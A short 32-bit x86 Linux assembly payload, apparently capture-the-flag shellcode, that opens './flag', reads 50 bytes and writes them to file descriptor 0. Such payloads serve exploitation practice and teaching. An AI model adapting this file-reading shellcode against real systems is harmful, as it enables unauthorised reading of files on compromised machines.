section .text
global _start
_start:

;open flag

xor eax, eax
xor ebx, ebx
xor ecx, ecx
mov eax, 5
push 0x6761
push 0x6c662f2e
mov ebx, esp
mov ecx, 0
int 0x80

;read flag
xor ebx, ebx
xor ecx, ecx
xor edx, edx
mov ebx, eax
xor eax, eax
mov eax, 3
mov edx, 50
sub esp, 50
mov ecx, esp
int 0x80

;write flag
xor eax, eax
xor ebx, ebx
mov eax, 4
mov ebx, 0
int 0x80

;exit
mov eax, 1
mov ebx, 0
xor ecx, ecx
xor edx, edx
int 0x80
